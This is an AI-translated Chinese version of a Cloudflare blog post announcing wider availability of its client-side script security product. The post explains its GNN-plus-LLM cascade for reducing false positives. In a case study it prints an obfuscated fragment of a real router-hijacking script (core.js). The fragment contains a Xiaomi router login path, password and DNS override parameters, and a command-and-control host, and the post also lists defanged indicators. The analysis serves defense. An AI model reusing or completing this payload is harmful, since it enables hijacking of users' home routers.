---
title: Cloudflare客户端安全升级：智能检测恶意脚本，现已全面开放
title_original: 'Cloudflare Client-Side Security: smarter detection, now open to everyone'
date: '2026-03-30'
source: Cloudflare Blog
source_url: https://blog.cloudflare.com/client-side-security-open-to-everyone/
author: ''
summary: Cloudflare宣布其客户端安全高级版（原Page Shield）向所有自助服务客户开放，并免费提供基于域名的威胁情报。该产品每天评估35亿个脚本，通过浏览器报告收集信号，无需扫描器即可实现零延迟防护。文章重点介绍了其新型AI检测系统：利用图神经网络（GNN）进行高召回率的一线检测，再引入大语言模型（LLM）进行二次研判，以大幅降低误报率，解决因恶意攻击罕见而导致的类别不平衡问题。
categories:
- AI产品
tags:
- 网络安全
- 客户端安全
- 恶意脚本检测
- 机器学习
- Cloudflare
draft: false
translated_at: '2026-03-31T05:05:37.164659'
---

# Cloudflare 客户端安全：更智能的检测，现已向所有人开放

2026-03-30

- Zhiyuan Zheng
- Juan Miguel Cejuela

![](/images/posts/332f2c290793.png)

客户端侧录攻击拥有一项乏味的超能力：它们可以在不破坏任何东西的情况下窃取数据。页面依然正常加载。结账流程依然完成。它所需要的，仅仅是一个恶意的脚本标签。

如果这听起来很抽象，以下是最近发生的两个此类侧录攻击示例：

- 2026年1月，Sansec报告了一个在美国一家主要银行的员工商品商店网站上运行的浏览器端键盘记录器，窃取个人数据、登录凭证和信用卡信息。
- 2025年9月，攻击者发布了被广泛使用的npm包的恶意版本。如果这些包被捆绑到前端代码中，最终用户可能在浏览器中面临加密货币窃取的风险。

为了进一步实现我们建设更美好互联网的目标，Cloudflare在2025年生日周期间确立了一个核心原则：强大的安全功能应该无需销售接洽即可获取。为了实现这一目标，我们今天宣布两项关键变更：

首先，Cloudflare客户端安全高级版（原Page Shield附加组件）现已向自助服务客户开放。其次，基于域名的威胁情报现在对所有使用免费客户端安全捆绑包的客户免费提供。

在本文中，我们将解释该产品的工作原理，并重点介绍一个旨在识别恶意JavaScript同时最大限度减少误报的新型AI检测系统。我们还将讨论这些工具的几个实际应用场景。

## Cloudflare 客户端安全如何工作

Cloudflare 客户端安全每天评估35亿个脚本，平均每个企业区域保护2,200个脚本。

在底层，客户端安全通过浏览器报告（例如，内容安全策略）收集这些信号，这意味着您无需扫描器或应用插装即可开始使用，并且对您的Web应用程序的延迟影响为零。唯一的先决条件是您的流量通过Cloudflare代理。

客户端安全高级版提供对强大安全功能的即时访问：

- 更智能的恶意脚本检测：利用内部机器学习，此功能现已通过大语言模型的评估得到增强。阅读下文了解更多详情。
- 代码变更监控：包含持续的代码变更检测和监控，这对于满足PCI DSS v4 11.6.1等合规要求至关重要。
- 主动阻止规则：受益于通过持续监控维护和执行的正向内容安全规则。

## 检测恶意意图的JavaScript

管理客户端安全是一个巨大的数据问题。对于一个平均的企业区域，我们的系统观察到大约2,200个独特的脚本；较小的商业区域通常处理大约1,000个。仅这个数量就难以管理，但真正的挑战在于代码的易变性。

大约三分之一的脚本在任何30天窗口内都会进行代码更新。如果安全团队试图手动批准每一个新的DOM交互或出站连接，由此产生的开销将使开发流程陷入瘫痪。

相反，我们的检测策略专注于脚本试图做什么。这包括我们之前写过的意图分类工作。简而言之，我们使用抽象语法树分析脚本的行为。通过将代码分解为其逻辑结构，我们可以识别出表明恶意意图的模式，无论代码如何混淆。

## 误报的高昂代价

客户端安全的运作方式不同于部署在网络上的主动漏洞扫描器，后者由Web应用防火墙持续观察匹配的攻击特征。虽然WAF不断阻止大量的自动化攻击，但客户端侧漏洞（例如源服务器或第三方供应商的泄露）是罕见但影响巨大的事件。在拥有严格供应商审查和代码扫描的企业环境中，这类攻击很少见。

这种罕见性带来了一个问题。由于真正的攻击并不频繁，安全系统的检测在统计上更可能是误报。对于安全团队来说，这些误报会造成疲劳并掩盖真正的威胁。为了解决这个问题，我们将一个大语言模型集成到我们的检测流程中，大幅降低了误报率。

## 引入基于LLM的二次意见进行分流

我们的前线检测引擎是一个图神经网络。GNN特别适合这项任务：它们在JavaScript代码的抽象语法树上运行，学习能够捕获执行模式的结构表示，无论变量重命名、代码压缩或混淆如何。用机器学习术语来说，GNN学习代码图结构的嵌入，该嵌入能够泛化到相同语义行为的不同语法变体。

GNN被调整为高召回率。我们希望捕获新颖的零日威胁。其精确度已经非常高：总分析流量中被标记为误报的比例不到0.3%。然而，在Cloudflare每天评估35亿个脚本的规模下，即使是低于0.3%的误报率，也会转化为可能对客户造成干扰的大量误报。

核心问题是一个经典的类别不平衡问题。虽然我们可以收集大量的恶意样本，但网络上良性JavaScript的多样性实际上是无限的。高度混淆但完全合法的脚本——例如机器人挑战、跟踪像素、广告技术捆绑包和压缩的框架构建——可能表现出与恶意代码在GNN学习到的特征空间中有重叠的结构模式。尽管我们尽力覆盖大量有趣的良性案例，但模型在训练期间根本无法看到这种无限多样性中的足够样本。

这正是大语言模型对GNN进行补充的地方。LLM对现实世界的JavaScript实践具有深刻的语义理解：它们能识别特定领域的惯用法、常见的框架模式，并且能够区分可疑但无害的混淆与真正的恶意意图。

我们没有替换GNN，而是设计了一个级联分类器架构：

1.  每个脚本首先由GNN评估。如果GNN预测脚本是良性的，检测流程立即终止。对于绝大多数流量，这仅产生GNN的最小延迟，完全绕过了LLM更重的计算时间。
2.  如果GNN将脚本标记为潜在恶意（超过决策阈值），脚本将被转发到托管在Cloudflare Workers AI上的开源LLM进行二次意见评估。
3.  LLM在提供专门的安全提示上下文后，从语义上评估脚本的意图。如果它确定脚本是良性的，则会覆盖GNN的判定。

每个脚本首先由GNN进行评估。如果GNN预测脚本是良性的，检测流程会立即终止。对于绝大多数流量，这仅产生GNN的最小延迟，完全绕过了LLM更重的计算时间。

如果GNN将脚本标记为潜在恶意（超过决策阈值），该脚本会被转发到托管在Cloudflare Workers AI上的开源LLM进行二次判断。

LLM在获得专门针对安全场景的提示词上下文后，会对脚本的意图进行语义评估。如果它判定脚本是良性的，则会推翻GNN的判定。

这种两阶段设计让我们兼得两者之长：GNN对结构性恶意模式的高召回率，结合LLM广泛的语义理解能力以过滤误报。

正如我们之前解释的，我们的GNN是在可公开访问的脚本URL上训练的，这些脚本与任何浏览器会获取的脚本相同。运行时的LLM推理完全通过Workers AI在Cloudflare网络内部使用开源模型进行（我们目前使用gpt-oss-120b）。

作为额外的安全网，每个被GNN标记的脚本都会被记录到Cloudflare R2中供后续分析。这使我们能够持续审计LLM的推翻判定是否正确，并捕获任何真实攻击可能被无意中过滤掉的边缘情况。是的，我们为自己的ML流程"吃自己的狗粮"——使用我们自己的存储产品。

我们对真实生产流量的内部评估结果令人信服。聚焦于JS Integrity威胁类别下的总分析流量，第二层LLM验证将误报率降低了近3倍：将本已较低的约0.3%误报率降至约0.1%。在评估唯一脚本时，影响更为显著：误报率大幅下降了约200倍，从约1.39%降至仅0.007%。

在我们的规模下，将总体误报率降低三分之二，意味着每天为我们的客户减少数百万次误报。至关重要的是，我们的真阳性（实际攻击）检测能力包含一个回退机制：如上所述，我们会审计LLM的推翻判定，以检查是否有可能的真实攻击被LLM过滤掉。

因为LLM在此流程中充当了高度可靠的精确过滤器，我们现在可以降低GNN的决策阈值，使其更具攻击性。这意味着我们能捕获那些以前刚好低于检测边界的新型、高度混淆的真实攻击，同时不会让客户被误报淹没。在下一阶段，我们计划进一步推进这一点。

### 捕获野外零日漏洞：core.js路由器漏洞利用

这种两阶段架构已经在实践中证明了其价值。就在最近，我们的检测流程标记了一个针对特定区域用户的新型、高度混淆的恶意脚本（core.js）。

在这个案例中，有效载荷被设计用来劫持家庭路由器（特别是基于小米OpenWrt的设备）。通过反混淆仔细检查后，该脚本表现出显著的环境感知能力：它查询路由器的WAN配置（使用如`wanType=dhcp`、`wanType=static`和`wanType=pppoe`等参数动态调整其有效载荷），覆盖DNS设置以通过中国公共DNS服务器劫持流量，甚至试图通过静默更改管理员密码来锁定合法所有者。它并非直接入侵网站，而是通过被入侵的浏览器扩展程序注入到用户会话中。

为了逃避检测，该脚本的核心逻辑被严重压缩，并使用数组字符串混淆器进行打包——这是一种经典技巧，但足够有效，以至于像VirusTotal这样的传统威胁情报平台在撰写本文时尚未报告检测。

尽管存在混淆，我们的GNN成功地揭示了其潜在的恶意结构，并且Workers AI LLM自信地确认了其意图。以下是显示目标路由器API和尝试注入恶意DNS服务器的有效载荷片段：

```JavaScript
const _0x1581=['bXhqw','=sSMS9WQ3RXc','cookie','qvRuU','pDhcS','WcQJy','lnqIe','oagRd','PtPlD','catch','defaultUrl','rgXPslXN','9g3KxI1b','123123123','zJvhA','content','dMoLJ','getTime','charAt','floor','wZXps','value','QBPVX','eJOgP','WElmE','OmOVF','httpOnly','split','userAgent','/?code=10&asyn=0&auth=','nonce=','dsgAq','VwEvU','==wb1kHb9g3KxI1b','cNdLa','W748oghc9TefbwK','_keyStr','parse','BMvDU','JYBSl','SoGNb','vJVMrgXPslXN','=Y2KwETdSl2b','816857iPOqmf','uexax','uYTur','LgIeF','OwlgF','VkYlw','nVRZT','110594AvIQbs','LDJfR','daPLo','pGkLa','nbWlm','responseText','20251212','EKjNN','65kNANAl','.js','94963VsBvZg','WuMYz','domain','tvSin','length','UBDtu','pfChN','1TYbnhd','charCodeAt','/cgi-bin/luci/api/xqsystem/login','http://192.168.','trace','https://api.qpft5.com','&newPwd=','mWHpj','wanType','XeEyM','YFBnm','RbRon','xI1bxI1b','fBjZQ','shift','=8yL1kHb9g3KxI1b','http://','LhGKV','AYVJu','zXrRK','status','OQjnd','response','AOBSe','eTgcy','cEKWR','&dns2=','fzdsr','filter','FQXXx','Kasen','faDeG','vYnzx','Fyuiu','379787JKBNWn','xiroy','mType','arGpo','UFKvk','tvTxu','ybLQp','EZaSC','UXETL','IRtxh','HTnda','trim','/fee','=82bv92bv92b','BGPKb','BzpiL','MYDEF','lastIndexOf','wypgk','KQMDB','INQtL','YiwmN','SYrdY','qlREc','MetQp','Wfvfh','init','/ds','HgEOZ','mfsQG','address','cDxLQ','owmLP','IuNCv','=syKxEjUS92b','then','createOffer','aCags','tJHgQ','JIoFh','setItem','ABCDEFGHJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789','Kwshb','ETDWH','0KcgeX92i0efbwK','stringify','295986XNqmjG','zfJMl','platform','NKhtt','onreadystatechange','88888888','push','cJVJO','XPOwd','gvhyl','ceZnn','fromCharCode',';Secure','452114LDbVEo','vXkmg','open','indexOf','UiXXo','yyUvu','ddp','jHYBZ','iNWCL','info','reverse','i4Q18Pro9TefbwK','mAPen','3960IiTopc','spOcD','dbKAM','ZzULq','bind','GBSxL','=A3QGRFZxZ2d','toUpperCase','AvQeJ','diWqV','iXtgM','lbQFd','iOS','zVowQ','jTeAP','wanType=dhcp&autoset=1&dns1=','fNKHB','nGkgt','aiEOB','dpwWd','yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW','encode','gWYAY','mckDW','createDataChannel'];
const _0x4b08=function(_0x5cc416,_0x2b0c4c){_0x5cc416=_0x5cc416-0x1d5;let _0xd00112=_0x1581[_0x5cc416];return _0xd00112;};
(function(_0x3ff841,_0x4d6f8b){const _0x45acd8=_0x4b08;while(!![]){try{const _0x1933aa=-parseInt(_0x45acd8(0x275))*-parseInt(_0x45acd8(0x264))+-parseInt(_0x45acd8(0x1ff))+parseInt(_0x45acd8(0x25d))+-parseInt(_0x45acd8(0x297))+parseInt(_0x45acd8(0x20c))+parseInt(_0x45acd8(0x26e))+-parseInt(_0x45acd8(0x219))*parseInt(_0x45acd8(0x26c));if(_0x1933aa===_0x4d6f8b)break;else _0x3ff841['push'](_0x3ff841['shift']());}catch(_0x8e5119){_0x3ff841['push'](_0x3ff841['shift']());}}}(_0x1581,0x842ab));
```

这正是那种基于静态签名的WAF会漏掉，但我们的结构和语义AI方法能够捕获的复杂、零日威胁。

#### 入侵指标

- URL:hxxps://ns[.]qpft5[.]com/ads/core[.]js
- SHA-256:4f2b7d46148b786fae75ab511dc27b6a530f63669d4fe9908e5f22801dea9202
- C2域名:hxxps://api[.]qpft5[.]com

URL:hxxps://ns[.]qpft5[.]com/ads/core[.]js

SHA-256:4f2b7d46148b786fae75ab511dc27b6a530f63669d4fe9908e5f22801dea9202

C2域名:hxxps://api[.]qpft5[.]com

## 面向所有人的基于域名的威胁情报

今天，我们向所有Cloudflare客户端安全客户提供基于域名的威胁情报，无论您是否使用高级版。

2025年，我们看到许多非企业客户受到客户端攻击的影响，尤其是在Magento平台上运营网店的客户。这些攻击在被公开后仍持续数天甚至数周。中小企业通常缺乏维持高标准安全所需的企业级资源和专业知识。

通过向所有人提供基于域名的威胁情报，我们为网站所有者提供了关于影响其用户的攻击的关键直接信号。这些信息使他们能够立即采取行动清理网站并调查潜在的源头入侵。

要开始使用，只需在仪表板中通过开关启用客户端安全功能。随后，我们将高亮显示任何与已知恶意域名关联的JavaScript或连接。

## 开始使用符合PCI DSS v4标准的客户端安全高级版

要了解更多关于客户端安全高级版的定价信息，请访问计划页面。在确认购买前，我们将根据您上个月的HTTP请求量预估费用，以便您确切了解预期成本。

作为电子商务商家，客户端安全高级版提供了满足PCI DSS v4要求（特别是6.4.3和11.6.1条款）所需的所有工具。立即在仪表板中注册使用。

---

> 本文由AI自动翻译，原文链接：[Cloudflare Client-Side Security: smarter detection, now open to everyone](https://blog.cloudflare.com/client-side-security-open-to-everyone/)
> 
> 翻译时间：2026-03-31 05:05
